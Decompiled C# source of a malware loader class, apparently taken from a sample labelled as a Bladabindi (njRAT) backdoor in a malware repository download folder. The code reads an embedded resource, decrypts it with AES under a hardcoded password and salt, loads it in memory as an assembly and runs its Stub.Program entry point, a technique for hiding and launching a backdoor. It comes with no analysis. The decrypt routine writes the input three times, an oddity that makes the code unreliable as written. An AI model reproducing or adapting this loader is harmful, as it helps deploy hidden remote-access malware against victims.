// Decompiled with JetBrains decompiler
// Type: Loader.Nyan
// Assembly: sfud, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 417391F8-C341-4C0D-A02C-C74C145C9687
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Backdoor.MSIL.Bladabindi.gen-4bdcab6e5a078fb21d0ce208f9b9b025fc7a3baa049c359d7664c7a00ac83d30.exe

using Microsoft.CSharp.RuntimeBinder;
using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace Loader
{
  public class Nyan : Form
  {
    public Nyan() => this.Initialize();

    public void Initialize()
    {
      object instance = Activator.CreateInstance(AppDomain.CurrentDomain.Load(Nyan.AES_Decrypt(Nyan.GetResource("1qkzjkdv0da"))).GetType("Stub.Program"));
      // ISSUE: reference to a compiler-generated field
      if (Nyan.\u003CInitialize\u003Eo__SiteContainer0.\u003C\u003Ep__Site1 == null)
      {
        // ISSUE: reference to a compiler-generated field
        Nyan.\u003CInitialize\u003Eo__SiteContainer0.\u003C\u003Ep__Site1 = CallSite<Action<CallSite, object>>.Create(Microsoft.CSharp.RuntimeBinder.Binder.InvokeMember(CSharpBinderFlags.ResultDiscarded, "Run", (IEnumerable<System.Type>) null, typeof (Nyan), (IEnumerable<CSharpArgumentInfo>) new CSharpArgumentInfo[1]
        {
          CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, (string) null)
        }));
      }
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      Nyan.\u003CInitialize\u003Eo__SiteContainer0.\u003C\u003Ep__Site1.Target((CallSite) Nyan.\u003CInitialize\u003Eo__SiteContainer0.\u003C\u003Ep__Site1, instance);
    }

    private static byte[] AES_Decrypt(byte[] bytesToBeDecrypted)
    {
      byte[] salt = new byte[8]
      {
        (byte) 1,
        (byte) 2,
        (byte) 3,
        (byte) 4,
        (byte) 5,
        (byte) 6,
        (byte) 7,
        (byte) 8
      };
      using (MemoryStream memoryStream = new MemoryStream())
      {
        using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
        {
          rijndaelManaged.KeySize = 256;
          rijndaelManaged.BlockSize = 128;
          Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(Encoding.UTF8.GetBytes("rhzy40ecret"), salt, 1000);
          rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
          rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
          rijndaelManaged.Mode = CipherMode.CBC;
          using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
          {
            cryptoStream.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
            cryptoStream.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
            cryptoStream.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
            cryptoStream.Close();
          }
          return memoryStream.ToArray();
        }
      }
    }

    private static byte[] GetResource(string file) => (byte[]) new ResourceManager("w2kfklulco1", Assembly.GetExecutingAssembly()).GetObject(file);
  }
}
